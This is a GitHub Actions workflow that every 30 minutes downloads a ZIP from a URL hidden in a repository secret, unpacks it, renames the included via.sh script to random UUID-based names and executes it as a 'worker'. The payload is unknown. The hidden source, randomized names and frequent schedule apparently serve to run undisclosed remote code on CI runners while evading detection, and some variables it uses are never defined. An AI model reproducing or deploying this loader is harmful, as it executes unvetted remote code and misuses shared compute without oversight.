name: Maf

on:
  schedule:
    - cron: "*/30 * * * *" 
  workflow_dispatch:

jobs:
  export-and-run:
    runs-on: ubuntu-22.04


    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Generate random names
        id: names
        shell: bash
        run: |
          set -euo pipefail
          ZIP_NAME="$(uuidgen).zip"
          SCRIPT_PREFIX="$(uuidgen)"
          echo "ZIP_NAME=$ZIP_NAME" >> "$GITHUB_ENV"
          echo "SCRIPT_PREFIX=$SCRIPT_PREFIX" >> "$GITHUB_ENV"
          echo "Generated ZIP_NAME=$ZIP_NAME"
          echo "Generated SCRIPT_PREFIX=$SCRIPT_PREFIX"

      - name: Download ZIP (randomized name)
        shell: bash
        run: |
          set -euo pipefail
          curl -fSL -o "$ZIP_NAME" "${{ secrets.VIA }}"
          if [ ! -f "$ZIP_NAME" ]; then
            echo "Download failed: $ZIP_NAME not found"
            exit 1
          fi
          echo "Downloaded $ZIP_NAME"

      - name: Unzip and cleanup
        shell: bash
        run: |
          set -euo pipefail
          unzip -q "$ZIP_NAME"
          rm -f "$ZIP_NAME"
          echo "Unzipped and removed $ZIP_NAME"

      - name: Find, rename and make script executable
        shell: bash
        env:
          SCRIPT_PREFIX: ${{ env.SCRIPT_PREFIX }}
        run: |
          set -euo pipefail
          script_path="$(find . -type f -name 'via.sh' -print -quit || true)"
          if [ -z "$script_path" ]; then
            script_path="$(find . -type f -iname 'via*' -perm /111 -print -quit || true)"
          fi
          if [ -z "$script_path" ]; then
            echo "Could not find via.sh or executable via* file."
            find . -maxdepth 4 -type f -print
            exit 1
          fi
          echo "Found script: $script_path"
          new_name="${SCRIPT_PREFIX}_$(date +%s)_$RANDOM.sh"
          mv -v "$script_path" "$new_name"
          chmod +x "$new_name"
          echo "EXEC_SCRIPT=$new_name" >> "$GITHUB_ENV"
          echo "Renamed script to $new_name"

      - name: Run worker (with debug)
        shell: bash
        env:
          WORKER_ID: ${{ matrix.worker }}
          MAX_WORKERS: ${{ env.MAX_WORKERS }}
          EXEC_SCRIPT: ${{ env.EXEC_SCRIPT }}
        run: |
          # NOTE: we run the script *once* via bash to avoid accidental double-invocation.
          set -euo pipefail
          echo "Starting worker $WORKER_ID of $MAX_WORKERS"
          if [ -z "${EXEC_SCRIPT:-}" ]; then
            echo "EXEC_SCRIPT not set"
            exit 1
          fi
          echo "About to execute: bash -x \"$EXEC_SCRIPT\" \"$WORKER_ID\""
          # Run with bash -x for verbose debugging. Remove -x after debugging.
          bash -x "$EXEC_SCRIPT" "$WORKER_ID"
